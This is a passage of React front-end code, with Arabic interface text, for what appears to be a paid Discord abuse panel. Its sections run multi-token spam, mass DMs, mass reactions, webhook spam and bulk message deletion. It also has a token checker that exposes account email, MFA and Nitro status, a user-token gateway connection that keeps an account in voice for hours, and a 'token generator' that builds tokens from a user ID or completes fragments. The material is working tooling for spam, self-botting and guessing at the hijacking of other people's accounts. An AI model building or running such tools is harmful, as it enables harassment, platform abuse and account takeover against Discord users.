                <ActionBtn text="🔥 بدء السبام المتعدد" loading={loading} color="orange" onClick={() => { const tokenList = multiSpamTokens.split('\n').map(t => t.trim()).filter(t => t.length >= 20); if (tokenList.length === 0) { setResult('❌ أدخل توكن واحد على الأقل'); return }; const msgList = msMessages.split('\n').map(m => m.trim()).filter(Boolean); if (msgList.length === 0) { setResult('❌ أدخل رسالة'); return }; api('multi-spam', { tokens: tokenList, channelId: msChannelId, messages: msgList, duration: msDuration, speed: msSpeed }) }} />
              </div></div>
            )}

            {/* ==================== MASS DM ==================== */}
            {section === 'mass-dm' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-purple-500/15 shadow-xl shadow-black/20">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">📧</span><h2 className="text-xl font-black text-purple-400">DM جماعي</h2></div>
                <p className="text-slate-500 text-sm mb-5">إرسال رسالة خاصة لكل محادثات DM في حسابك - حد أقصى 50 محادثة</p>
                <TokenInput label="🎫 توكن الحساب (User Token)" value={massDmToken} onChange={setMassDmToken} accent="purple" onHelp={() => setShowTokenGuide(true)} />
                <div className="bg-purple-500/5 rounded-xl p-3 mb-5 border border-purple-500/10"><p className="text-[11px] text-purple-400/80 leading-relaxed">⚠️ يجب استخدام توكن حساب (User Token) وليس توكن بوت!<br />📧 يرسل لكل محادثات DM الموجودة في حسابك تلقائياً<br />🛡️ الحد الأقصى 50 محادثة لحماية حسابك من التحذيرات</p></div>
                <div className="mb-5"><label className="text-[11px] text-purple-300/70 mb-1 block">💬 رسالة DM</label><textarea value={dmMessage} onChange={e => setDmMessage(e.target.value)} placeholder="اكتب رسالتك هنا..." rows={3} className="w-full bg-black/30 border border-purple-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-purple-700/30 focus:outline-none focus:border-purple-400/50 resize-none transition-colors" /></div>
                <ActionBtn text="📧 بدء الإرسال الجماعي" loading={loading} color="purple" onClick={() => { if (!massDmToken) { setResult('❌ أدخل التوكن'); return }; if (!dmMessage) { setResult('❌ أدخل الرسالة'); return }; api('mass-dm', { token: massDmToken, message: dmMessage }) }} />
              </div></div>
            )}

            {/* ==================== LEAVER ==================== */}
            {section === 'leaver' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-red-500/15 shadow-xl shadow-black/20">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🚪</span><h2 className="text-xl font-black text-red-400">مغادرة السيرفرات</h2></div>
                <p className="text-slate-500 text-sm mb-5">مغادرة كل السيرفرات بضغطة واحدة - السيرفرات المملوكة تُتجنّب</p>
                <TokenInput label="🎫 التوكن" value={leaverToken} onChange={setLeaverToken} accent="red" onHelp={() => setShowTokenGuide(true)} />
                <div className="grid grid-cols-2 gap-2.5 mb-5">
                  <ActionBtn text="🚪 مغادرة الكل" loading={loading} color="red" onClick={() => api('leaver', { token: leaverToken, action: 'leave_all' })} />
                  <ActionBtn text="📋 عرض السيرفرات" loading={loading} onClick={async () => { if (!leaverToken) { setResult('❌ أدخل التوكن'); return }; setLoading(true); setProgress('🔍 جلب السيرفرات...'); try { const res = await fetch('/api/leaver', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: leaverToken, action: 'list' }) }); const data = await res.json(); if (data.success) { setGuildList(data.guilds); setResult(`📋 لديك ${data.total} سيرفر`) } else { setResult(`❌ ${data.error}`) } } catch { setResult('❌ خطأ') }; setLoading(false); setProgress('') }} />
                </div>
                {guildList.length > 0 && (<div className="mt-4 bg-black/30 rounded-2xl p-4 border border-red-500/15 animate-fade-in">
                  <h3 className="font-bold text-red-400 text-sm mb-3">🏰 السيرفرات ({guildList.length})</h3>
                  <div className="space-y-1 max-h-96 overflow-auto">{guildList.map((g, i) => (<div key={i} className="flex justify-between items-center px-3 py-2 rounded-lg text-xs bg-black/20 border border-white/5"><div><span className="text-white/80 font-medium">{g.name}</span>{g.owner && <span className="text-yellow-400 ml-2">👑 مالك</span>}</div><span className="text-white/40">{g.members || '?'} عضو</span></div>))}</div>
                </div>)}
              </div></div>
            )}

            {/* ==================== MASS REACT ==================== */}
            {section === 'react' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-yellow-500/15 shadow-xl shadow-black/20">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🎭</span><h2 className="text-xl font-black text-yellow-400">رياكشن جماعي</h2></div>
                <p className="text-slate-500 text-sm mb-5">{reactMode === 'auto' ? '🔄 رياكشن تلقائي لكل رسالة جديدة' : 'وضع رياكشنات على رسائل - عدة إيموجيات بالتوازي'}</p>
                <div className="mb-4">
                  <label className="text-[11px] text-yellow-300/70 mb-1 block">🎫 التوكنات (توكن واحد لكل سطر)</label>
                  <textarea value={reactToken} onChange={e => setReactToken(e.target.value)} placeholder={"توكن 1\nتوكن 2\nتوكن 3"} rows={3} className="w-full bg-black/30 border border-yellow-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-yellow-700/30 focus:outline-none focus:border-yellow-400/50 resize-none font-mono transition-colors" />
                </div>
                <TextInput label="📺 أيدي الروم" value={reactChannelId} onChange={setReactChannelId} placeholder="Channel ID" accent="yellow" />
                <div className="flex gap-2 mb-4">{['manual', 'auto'].map(mode => (<button key={mode} onClick={() => setReactMode(mode as any)} className={`flex-1 py-2.5 rounded-xl text-sm font-bold transition-all cursor-pointer ${reactMode === mode ? 'bg-yellow-500/20 text-yellow-400 border border-yellow-500/30' : 'bg-black/20 text-yellow-600 hover:text-yellow-400 border border-transparent'}`}>{mode === 'auto' ? '🔄 تلقائي' : '✏️ يدوي'}</button>))}</div>
                <div className="mb-4"><label className="text-[11px] text-yellow-300/70 mb-1 block">🎭 الإيموجيات (مسافة بين كل واحد)</label><input type="text" value={reactEmoji} onChange={e => setReactEmoji(e.target.value)} placeholder="👍 ❤️ 🔥 🎉" className="w-full bg-black/30 border border-yellow-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-yellow-700/30 focus:outline-none focus:border-yellow-400/50 transition-colors" /></div>
                {reactMode === 'manual' ? (
                  <TextInput label="📩 أيدي رسالة محددة (اختياري)" value={reactMessageId} onChange={setReactMessageId} placeholder="Message ID (اتركه فاضي للرسائل الأخيرة)" accent="yellow" />
                ) : (
                  <div className="mb-4"><label className="text-[11px] text-yellow-300/70 mb-1 block">⏱️ المدة (ثانية)</label><input type="number" value={reactDuration} onChange={e => setReactDuration(Number(e.target.value))} className="w-full bg-black/30 border border-yellow-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-yellow-400/50 transition-colors" /></div>
                )}
                <ActionBtn text={reactMode === 'auto' ? '🔄 بدء الرايكشن التلقائي' : '🎭 وضع رياكشنات'} loading={loading} color="yellow" onClick={() => { if (!reactEmoji) { setResult('❌ أدخل إيموجي واحد على الأقل'); return }; const tokenList = reactToken.split('\n').map(t => t.trim()).filter(t => t.length >= 20); if (tokenList.length === 0) { setResult('❌ أدخل توكن واحد على الأقل'); return }; api('mass-react', { tokens: tokenList, channelId: reactChannelId, emoji: reactEmoji, messageId: reactMessageId || undefined, mode: reactMode, duration: reactMode === 'auto' ? reactDuration : undefined }) }} />
              </div></div>
            )}

            {/* ==================== TOKEN CHECKER ==================== */}
            {section === 'checker' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-cyan-500/15 shadow-xl shadow-black/20">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🔍</span><h2 className="text-xl font-black text-cyan-400">فحص توكنات متعددة</h2></div>
                <p className="text-slate-500 text-sm mb-5">فحص مجموعة توكنات بالتوازي - 10 دفعات</p>
                <div className="mb-4"><label className="text-[11px] text-cyan-300/70 mb-1 block">🎫 التوكنات (كل توكن سطر)</label><textarea value={checkerTokens} onChange={e => setCheckerTokens(e.target.value)} placeholder={"توكن 1\nتوكن 2\nتوكن 3"} rows={6} className="w-full bg-black/30 border border-cyan-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-cyan-700/30 focus:outline-none focus:border-cyan-400/50 resize-none font-mono transition-colors" /></div>
                <ActionBtn text="🔍 فحص التوكنات" loading={loading} color="cyan" onClick={async () => { const list = checkerTokens.split('\n').map(t => t.trim()).filter(t => t.length >= 20); if (list.length === 0) { setResult('❌ أدخل توكن'); return }; await api('token-checker', { tokens: list }) }} />
                {checkerStats && (<div className="mt-5 grid grid-cols-3 gap-2 animate-fade-in"><div className="bg-green-500/8 rounded-xl p-3 border border-green-500/10 text-center"><div className="text-xl font-black text-green-400">{checkerStats.valid}</div><div className="text-[10px] text-green-300/60">صالح ✅</div></div><div className="bg-red-500/8 rounded-xl p-3 border border-red-500/10 text-center"><div className="text-xl font-black text-red-400">{checkerStats.invalid}</div><div className="text-[10px] text-red-300/60">غير صالح ❌</div></div><div className="bg-cyan-500/8 rounded-xl p-3 border border-cyan-500/10 text-center"><div className="text-xl font-black text-cyan-400">{checkerStats.nitro}</div><div className="text-[10px] text-cyan-300/60">نيترو 💎</div></div></div>)}
                {checkerResults.length > 0 && (<div className="mt-4 bg-black/30 rounded-2xl p-4 border border-cyan-500/15 animate-fade-in"><h3 className="font-bold text-cyan-400 text-sm mb-3 text-center">📋 نتائج الفحص ({checkerResults.length})</h3><div className="space-y-2 max-h-96 overflow-auto">{checkerResults.map((r, i) => (<div key={i} className={`rounded-xl p-3 border ${r.valid ? 'bg-green-500/8 border-green-500/15' : 'bg-red-500/8 border-red-500/10'}`}><div className="flex justify-between items-center mb-1"><span className={`font-mono text-xs ${r.valid ? 'text-green-400' : 'text-red-400'}`}>{r.token}</span><span className="text-xs">{r.valid ? <span className={r.type === 'bot' ? 'text-blue-400' : 'text-purple-400'}>{r.type === 'bot' ? '🤖 بوت' : '👤 يوزر'}</span> : <span className="text-red-400">❌ {r.error || 'غير صالح'}</span>}</span></div>{r.valid && (<div className="grid grid-cols-2 gap-1 text-[10px]"><span className="text-cyan-300/70">👤 {r.name}</span><span className="text-cyan-300/70">🆔 {r.id}</span>{r.nitro && <span className="text-cyan-300/70">{r.nitro}</span>}{r.email && <span className="text-cyan-300/70">{r.email}</span>}{r.mfa && <span className="text-cyan-300/70">{r.mfa}</span>}{r.createdAt && r.createdAt !== 'N/A' && <span className="text-cyan-300/70">📅 {r.createdAt}</span>}</div>)}</div>))}</div></div>)}
              </div></div>
            )}

            {/* ==================== WEBHOOK SPAM ==================== */}
            {section === 'webhook-spam' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-pink-500/15 shadow-xl shadow-black/20">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🔗</span><h2 className="text-xl font-black text-pink-400">ويب هوك سبام</h2></div>
                <p className="text-slate-500 text-sm mb-5">إرسال رسائل عبر ويب هوك Discord بسرعة عالية - 10 رسائل بالتوازي</p>
                <TokenInput label="🎫 التوكن (للتسجيل)" value={whSpamToken} onChange={setWhSpamToken} accent="pink" onHelp={() => setShowTokenGuide(true)} />
                <div className="mb-4"><label className="text-[11px] text-pink-300/70 mb-1 block">🔗 رابط الويب هوك</label><input type="text" value={whSpamUrl} onChange={e => setWhSpamUrl(e.target.value)} placeholder="https://discord.com/api/webhooks/..." className="w-full bg-black/30 border border-pink-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-pink-700/30 focus:outline-none focus:border-pink-400/50 transition-colors font-mono" /></div>
                <div className="mb-4"><label className="text-[11px] text-pink-300/70 mb-1 block">💬 محتوى الرسالة</label><textarea value={whSpamMessage} onChange={e => setWhSpamMessage(e.target.value)} placeholder="اكتب رسالتك هنا..." rows={3} className="w-full bg-black/30 border border-pink-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-pink-700/30 focus:outline-none focus:border-pink-400/50 resize-none transition-colors" /></div>
                <div className="grid grid-cols-2 gap-3 mb-4">
                  <div><label className="text-[11px] text-pink-300/70 mb-1 block">🔢 العدد</label><input type="number" value={whSpamCount} onChange={e => setWhSpamCount(Number(e.target.value))} className="w-full bg-black/30 border border-pink-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-pink-400/50 transition-colors" /></div>
                  <div><label className="text-[11px] text-pink-300/70 mb-1 block">👤 اسم المرسل (اختياري)</label><input type="text" value={whSpamUsername} onChange={e => setWhSpamUsername(e.target.value)} placeholder="TRJ BOT" className="w-full bg-black/30 border border-pink-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-pink-700/30 focus:outline-none focus:border-pink-400/50 transition-colors" /></div>
                </div>
                <ActionBtn text="🔗 بدء السبام" loading={loading} color="pink" onClick={() => { if (!whSpamUrl || !whSpamUrl.includes('discord.com/api/webhooks')) { setResult('❌ أدخل رابط ويب هوك صالح'); return }; if (!whSpamMessage) { setResult('❌ أدخل الرسالة'); return }; api('webhook-creator', { action: 'spam-existing', token: whSpamToken, guildId: '0', webhookUrls: [whSpamUrl], spamMessage: whSpamMessage, spamCount: whSpamCount, spamUsername: whSpamUsername || undefined }) }} />
              </div></div>
            )}

            {/* ==================== VOICE ONLINE ==================== */}
            {section === 'voice-online' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-purple-500/15 shadow-xl shadow-black/20">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🎤</span><h2 className="text-xl font-black text-purple-400">تثبيت فويس 24 ساعة</h2></div>
                <p className="text-slate-500 text-sm mb-5">⚡ اتصال مباشر عبر WebSocket - إعادة اتصال تلقائية - يعمل في الخلفية</p>
                <TokenInput label="🎫 التوكن" value={voiceToken} onChange={setVoiceToken} accent="purple" onHelp={() => setShowTokenGuide(true)} />
                <TextInput label="🏰 أيدي السيرفر" value={voiceGuildId} onChange={setVoiceGuildId} placeholder="Guild ID" accent="purple" />
                <TextInput label="🎤 أيدي روم الفويس" value={voiceChannelId} onChange={setVoiceChannelId} placeholder="Voice Channel ID" accent="purple" />
                <div className="mb-4">
                  <label className="text-[11px] text-purple-300/70 mb-2 block">⏱️ المدة</label>
                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 mb-2">
                    {[{ label: '1 ساعة', val: 3600 }, { label: '6 ساعات', val: 21600 }, { label: '12 ساعة', val: 43200 }, { label: '24 ساعة', val: 86400 }].map(p => (
                      <button key={p.val} onClick={() => setVoiceDuration(p.val)} className={`py-2 sm:py-2.5 rounded-xl text-[10px] sm:text-[11px] font-bold transition-all cursor-pointer ${voiceDuration === p.val ? 'bg-purple-500/25 text-purple-300 border border-purple-500/40' : 'bg-black/20 text-purple-600 hover:text-purple-400 border border-transparent'}`}>{p.label}</button>
                    ))}
                  </div>
                  <input type="number" value={voiceDuration} onChange={e => setVoiceDuration(Math.min(Math.max(Number(e.target.value), 60), 86400))} min={60} max={86400} className="w-full bg-black/30 border border-purple-500/30 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-purple-400/50 transition-colors" />
                </div>
                <ActionBtn text={voiceActive ? '⏹️ إيقاف التثبيت' : '🎤 تثبيت في الفويس'} loading={voiceConnecting} color="purple" onClick={() => {
                  if (voiceActive) { stopVoiceAnchor(); setResult('⏹️ تم إيقاف التثبيت'); return }
                  if (!voiceToken || !voiceGuildId || !voiceChannelId) { setResult('❌ أدخل التوكن + أيدي السيرفر + أيدي روم الفويس'); return }

                  setVoiceConnecting(true); setVoiceActive(true); setVoiceSessionCount(1)
                  setResult('🎤 جاري التحقق من التوكن...'); setProgress('')
                  setVoiceStatusLog(prev => [...prev.slice(-5), '🔍 جاري التحقق من التوكن...'])
                  const totalSec = voiceDuration; let elapsed = 0
                  const fmt = (s: number) => { const h = Math.floor(s/3600); const m = Math.floor((s%3600)/60); const sec = s%60; return h > 0 ? `${h}:${String(m).padStart(2,'0')}:${String(sec).padStart(2,'0')}` : `${m}:${String(sec).padStart(2,'0')}` }
                  setVoiceRemaining(fmt(totalSec))

                  // Validate token via API, then connect WebSocket directly
                  const connectVoice = async () => {
                    try {
                      const res = await fetch('/api/voice-online', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ token: voiceToken, guildId: voiceGuildId, channelId: voiceChannelId, duration: 270 })
                      })
                      const data = await res.json()
                      if (!data.success) {
                        setVoiceConnecting(false); setVoiceActive(false)
                        setResult(`❌ ${data.error || 'فشل التحقق'}`)
                        setVoiceStatusLog(prev => [...prev.slice(-5), `❌ فشل: ${data.error || 'خطأ'}`])
                        return
                      }

                      const gatewayUrl = data.gateway || 'wss://gateway.discord.gg/?v=10&encoding=json'
                      setVoiceStatusLog(prev => [...prev.slice(-5), `✅ تم التحقق - جاري الاتصال بـ Gateway...`])

                      const connectWs = () => {
                        if (voiceHbRef.current) { clearInterval(voiceHbRef.current); voiceHbRef.current = null }
                        if (voiceWsRef.current) { try { voiceWsRef.current.close(1000, 'reconnect') } catch {} }

                        const ws = new WebSocket(gatewayUrl)
                        voiceWsRef.current = ws
                        let heartbeatInterval = 0
                        let heartbeatSeq: number | null = null
                        let resumeUrl = gatewayUrl
                        let connectedGuild = voiceGuildId
                        let connectedChannel = voiceChannelId

                        ws.onopen = () => {
                          setVoiceStatusLog(prev => [...prev.slice(-5), '🔌 تم الاتصال بـ Gateway — بانتظار Hello...'])
                        }

                        ws.onmessage = (ev) => {
                          try {
                            const msg = JSON.parse(ev.data)
                            const op = msg.op
                            const t = msg.t

                            if (op === 10) {
                              // Hello — start heartbeat
                              heartbeatInterval = msg.d.heartbeat_interval
                              heartbeatSeq = null
                              setVoiceStatusLog(prev => [...prev.slice(-5), `💓 Heartbeat كل ${Math.round(heartbeatInterval/1000)} ثانية`])

                              voiceHbRef.current = setInterval(() => {
                                if (ws.readyState === WebSocket.OPEN) {
                                  ws.send(JSON.stringify({ op: 1, d: heartbeatSeq }))
                                }
                              }, heartbeatInterval)

                              // Send Identify
                              ws.send(JSON.stringify({
                                op: 2,
                                d: {
                                  token: voiceToken,
                                  intents: 1 << 7, // GUILD_VOICE_STATES
                                  properties: { os: 'browser', browser: 'trj-panel', device: 'trj-panel' },
                                  presence: { status: 'online', since: 0, activities: [], afk: false }
                                }
                              }))
                              setVoiceStatusLog(prev => [...prev.slice(-5), '📤 تم إرسال Identify — بانتظار READY...'])
                            }

                            if (op === 0) {
                              heartbeatSeq = msg.s
                              if (t === 'READY') {
                                resumeUrl = msg.d.resume_gateway_url ? `${msg.d.resume_gateway_url}?v=10&encoding=json` : gatewayUrl
                                setVoiceStatusLog(prev => [...prev.slice(-5), `✅ READY — متصل كـ ${msg.d.user?.username || 'Unknown'}`])
                                setResult('✅ تم الاتصال! جاري الانضمام للفويس...')

                                // Join voice channel via REST API (Gateway Identify won't join voice alone)
                                fetch('/api/voice-online', {
                                  method: 'POST',
                                  headers: { 'Content-Type': 'application/json' },
                                  body: JSON.stringify({ token: voiceToken, guildId: connectedGuild, channelId: connectedChannel, duration: 270 })
                                }).catch(() => {})

                                // Also try to send Voice State Update via Gateway
                                if (ws.readyState === WebSocket.OPEN) {
                                  ws.send(JSON.stringify({
                                    op: 4,
                                    d: {
                                      guild_id: connectedGuild,
                                      channel_id: connectedChannel,
                                      self_mute: false,
                                      self_deaf: false
                                    }
                                  }))
                                  setVoiceStatusLog(prev => [...prev.slice(-5), '🎤 تم إرسال طلب الانضمام للفويس'])
                                }

                                setVoiceConnecting(false)
                              }

                              if (t === 'RESUMED') {
                                setVoiceStatusLog(prev => [...prev.slice(-5), '🔄 تم استئناف الجلسة بنجاح'])
                              }

                              if (t === 'VOICE_SERVER_UPDATE') {
                                setVoiceSessionCount(c => c + 1)
                                setVoiceStatusLog(prev => [...prev.slice(-5), `🎤 صوت: ${msg.d.endpoint?.split('.')[0] || 'server'} (الجلسة #${voiceSessionCount + 1})`])
                              }

                              if (t === 'SESSIONS_INVALIDATE') {
                                setVoiceStatusLog(prev => [...prev.slice(-5), '⚠️ انتهت صلاحية الجلسة — إعادة اتصال...'])
                                setTimeout(() => { if (voiceActive) connectWs() }, 2000)
                                if (voiceHbRef.current) { clearInterval(voiceHbRef.current); voiceHbRef.current = null }
                              }
                            }

                            if (op === 9) {
                              // Invalid session — must close and reconnect with fresh identify
                              setVoiceStatusLog(prev => [...prev.slice(-5), '⚠️ جلسة غير صالحة — إعادة تعريف...'])
                              if (voiceHbRef.current) { clearInterval(voiceHbRef.current); voiceHbRef.current = null }
                              setTimeout(() => { if (voiceActive) connectWs() }, 2000)
                            }

                            if (op === 7) {
                              // Reconnect
                              setVoiceStatusLog(prev => [...prev.slice(-5), '🔄 طلب إعادة اتصال من السيرفر'])
                              if (voiceHbRef.current) { clearInterval(voiceHbRef.current); voiceHbRef.current = null }
                              setTimeout(() => { if (voiceActive) connectWs() }, 2000)
                            }

                            if (op === 11) {
                              // Heartbeat ACK
                            }
                          } catch {}
                        }

                        ws.onerror = () => {
                          setVoiceStatusLog(prev => [...prev.slice(-5), '❌ خطأ في اتصال WebSocket'])
                        }

                        ws.onclose = (ev) => {
                          if (voiceHbRef.current) { clearInterval(voiceHbRef.current); voiceHbRef.current = null }
                          if (ev.code === 4004) {
                            setVoiceStatusLog(prev => [...prev.slice(-5), '❌ التوكن غير صالح أو تم حظره'])
                            setVoiceActive(false); setVoiceConnecting(false)
                            setResult('❌ التوكن غير صالح')
                            return
                          }
                          if (ev.code === 4013) {
                            setVoiceStatusLog(prev => [...prev.slice(-5), '❌ لا تمتلك صلاحية الفويس'])
                            return
                          }
                          if (ev.code === 4014) {
                            setVoiceStatusLog(prev => [...prev.slice(-5), '❌ روم الفويس غير موجود'])
                            return
                          }
                          if (ev.reason === 'user_stop') {
                            setVoiceStatusLog(prev => [...prev.slice(-5), '⏹️ تم الإيقاف يدوياً'])
                            return
                          }
                          // Auto-reconnect
                          if (voiceActive) {
                            setVoiceStatusLog(prev => [...prev.slice(-5), `🔌 انقطع الاتصال (${ev.code}) — إعادة اتصال خلال 5 ثواني...`])
                            setTimeout(() => { if (voiceActive) connectWs() }, 5000)
                          }
                        }
                      }

                      // Start first connection
                      connectWs()

                      // Auto-reconnect every 4 minutes (240000ms) for fresh sessions
                      voiceTimerRef.current = setInterval(() => {
                        if (!voiceActive) return
                        setVoiceStatusLog(prev => [...prev.slice(-5), '🔄 إعادة اتصال دورية (كل 4 دقائق)...'])
                        setVoiceSessionCount(c => c + 1)
                        // Close and reconnect
                        if (voiceHbRef.current) { clearInterval(voiceHbRef.current); voiceHbRef.current = null }
                        if (voiceWsRef.current) { try { voiceWsRef.current.close(1000, 'periodic_reconnect') } catch {} }
                        setTimeout(() => {
                          if (voiceActive) connectWs()
                        }, 2000)
                      }, 240000)

                      // Countdown timer
                      voiceCountdownRef.current = setInterval(() => {
                        elapsed += 1; const rem = Math.max(totalSec - elapsed, 0)
                        if (rem <= 0) { stopVoiceAnchor(); setResult('✅ انتهت مدة التثبيت!'); setVoiceStatusLog(prev => [...prev.slice(-5), '✅ انتهت المدة المحددة']); return }
                        setVoiceRemaining(fmt(rem))
                      }, 1000)

                    } catch (err) {
                      setVoiceConnecting(false); setVoiceActive(false)
                      setResult('❌ خطأ في الاتصال')
                      setVoiceStatusLog(prev => [...prev.slice(-5), '❌ خطأ غير متوقع'])
                    }
                  }

                  connectVoice()
                }} />
                {voiceActive && <div className="mt-3 bg-purple-500/10 border border-purple-500/30 rounded-xl p-3 text-center">
                  <div className="text-purple-300 text-sm font-bold">{voiceConnecting ? '⏳ جاري الاتصال...' : '🎤 التثبيت يعمل الآن'}</div>
                  <div className="text-purple-400/70 text-xs mt-1">الجلسات: {voiceSessionCount} | المتبقي: {voiceRemaining}</div>
                  <div className="text-purple-500/40 text-[10px] mt-1">إعادة اتصال تلقائية كل 4 دقائق — أبقي التبويب مفتوح</div>
                </div>}
                {voiceStatusLog.length > 0 && (
                  <div className="mt-3 max-h-40 overflow-y-auto rounded-xl bg-black/30 border border-purple-500/10 p-2">
                    <div className="text-[10px] text-purple-400/50 mb-1 font-bold">📋 سجل الحالة:</div>
                    {voiceStatusLog.slice(-8).map((log, i) => (
                      <div key={i} className="text-[10px] text-purple-300/60 py-0.5 border-b border-white/[0.03] last:border-0">{log}</div>
                    ))}
                  </div>
                )}
              </div></div>
            )}
            {/* ==================== CHANNEL CLEAR ==================== */}
            {section === 'channel-clear' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-cyan-500/15 shadow-xl shadow-black/20">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🧹</span><h2 className="text-xl font-black text-cyan-400">مسح رسائل</h2></div>
                <p className="text-slate-500 text-sm mb-5">حذف عدد كبير من الرسائل من روم - بالتوازي و بسرعة</p>
                <TokenInput label="🎫 التوكن" value={clearToken} onChange={setClearToken} accent="cyan" onHelp={() => setShowTokenGuide(true)} />
                <TextInput label="📺 أيدي الروم" value={clearChannelId} onChange={setClearChannelId} placeholder="Channel ID" accent="cyan" />
                <div className="mb-5"><label className="text-[11px] text-cyan-300/70 mb-1 block">🗑️ عدد الرسائل للحذف (max 1000)</label><input type="number" value={clearCount} onChange={e => setClearCount(Math.min(Number(e.target.value), 1000))} min={1} max={1000} className="w-full bg-black/30 border border-cyan-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-cyan-400/50 transition-colors" /></div>
                <ActionBtn text="🧹 مسح الرسائل" loading={loading} color="cyan" onClick={() => { if (!clearToken || !clearChannelId) { setResult('❌ أدخل التوكن + أيدي الروم'); return }; api('channel-clear', { token: clearToken, channelId: clearChannelId, count: clearCount }) }} />
              </div></div>
            )}

            {/* ==================== TOKEN GENERATOR (PRIME) ==================== */}
            {section === 'token-generator' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-purple-500/15 shadow-xl shadow-black/20 relative min-h-[460px]">
                {!isPrime && (<div className="prime-lock-overlay">
                  <div className="prime-lock-icon">⭐</div>
                  <h3 className="text-xl font-black text-yellow-400">ميزة Prime فقط</h3>
                  <p className="text-sm text-white/40 text-center max-w-[240px] leading-relaxed">توليد التوكنات متاحة فقط لمشتركي Prime</p>
                  <button onClick={() => setShowPrimeModal(true)} className="btn-prime text-sm px-8 py-3 mt-2">⭐ اشتري Prime - 2M كرديت</button>
                </div>)}
                <div className="flex items-center gap-3 mb-5"><span className="text-2xl">🎰</span><h2 className="text-xl font-black text-purple-400">توليد توكنات ذكي</h2>{isPrime && (<span className="prime-badge text-[9px]">PRIME</span>)}</div>
                <p className="text-slate-500 text-sm mb-8">توليد ذكي - بنية توكن Discord حقيقية - حدد العدد و تولّد</p>

                <div className="mb-6"><label className="text-[11px] text-purple-300/70 mb-2 block">🔢 عدد التوكنات (1-200)</label><input type="number" value={tgCount} onChange={e => setTgCount(Math.min(Math.max(Number(e.target.value), 1), 200))} min={1} max={200} className="w-full bg-black/30 border border-purple-500/30 rounded-xl px-4 py-3.5 text-white text-sm focus:outline-none focus:border-purple-400/50 transition-colors" /></div>

                <div className="mb-6">
                  <label className="text-[11px] text-purple-300/70 mb-3 block">🔧 وضع التوليد</label>
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5">
                    {[{ id: 'random' as const, label: '🎲 عشوائي كامل', desc: 'ولّد من الصفر' }, { id: 'userid' as const, label: '👤 من أيدي حساب', desc: 'نصف توكن ذكي' }, { id: 'fragment' as const, label: '🧩 إكمال جزء', desc: 'أكمل الناقص' }].map(mode => (
                      <button key={mode.id} onClick={() => { if (tgRunning) stopTgGeneration(); setTgMode(mode.id); setTgResults([]); setTgHalfToken(''); setTgStats(null); setTgFragmentAnalysis(null); setResult('') }} className={`p-4 rounded-xl transition-all cursor-pointer border text-center ${tgMode === mode.id ? 'bg-purple-500/20 text-purple-400 border-purple-500/30 shadow-lg shadow-purple-500/5' : 'bg-white/3 text-white/40 border-white/10 hover:bg-white/5'}`}>
                        <div className="text-xs font-bold">{mode.label}</div>
                        <div className="text-[9px] mt-1.5 opacity-60">{mode.desc}</div>
                      </button>
                    ))}
                  </div>
                </div>
                {tgMode === 'userid' && (<>
                  <div className="mb-6"><TextInput label="👤 أيدي الحساب (Discord User ID)" value={tgUserId} onChange={setTgUserId} placeholder="مثال: 123456789012345678" accent="purple" /></div>
                  <div className="bg-purple-500/5 rounded-xl p-4 mb-6 border border-purple-500/10"><p className="text-[11px] text-purple-400/80 leading-relaxed">💡 ضع أيدي الحساب و الموقع تولّد نصف التوكن و تكمل الباقي بأنماط ذكية مختلفة - تتولّد لما لا نهائي لحد ما تضغط إيقاف</p></div>
                  {tgHalfToken && (<div className="bg-cyan-500/5 rounded-lg p-3.5 border border-cyan-500/15 mb-6 flex items-center gap-2"><span className="text-[10px] text-cyan-300">نصف التوكن:</span><code className="text-[10px] text-cyan-400 font-mono truncate flex-1">{tgHalfToken}.</code><button onClick={() => { navigator.clipboard.writeText(tgHalfToken).catch(() => {}) }} className="text-[10px] text-cyan-400 bg-cyan-500/10 px-2 py-1 rounded-lg border border-cyan-500/20 hover:bg-cyan-500/20 transition-colors cursor-pointer flex-shrink-0">📋</button></div>)}
                </>)}
                {tgMode === 'fragment' && (<>
                  <div className="mb-6"><label className="text-[11px] text-white/50 mb-2 block">🧩 جزء من التوكن (ضع أي جزء تعرفه)</label><textarea value={tgFragment} onChange={e => setTgFragment(e.target.value)} placeholder={'ضع أي جزء من التوكن هنا...\n\nمثال:\n• النصف الأول: Njg2OTI4NTk...\n• نصفين مع نقطة: Njg2OTI4NTk.MTc1NT\n• الجزء الأخير (hex): a3f8b2c1d4e5...\n• النصف الأول فقط: Njg2OTI4NTk.'} rows={4} className="w-full bg-black/30 border border-purple-500/30 rounded-xl px-4 py-3.5 text-white text-xs placeholder-purple-700/30 focus:outline-none focus:border-purple-400/50 resize-none transition-colors font-mono" /></div>
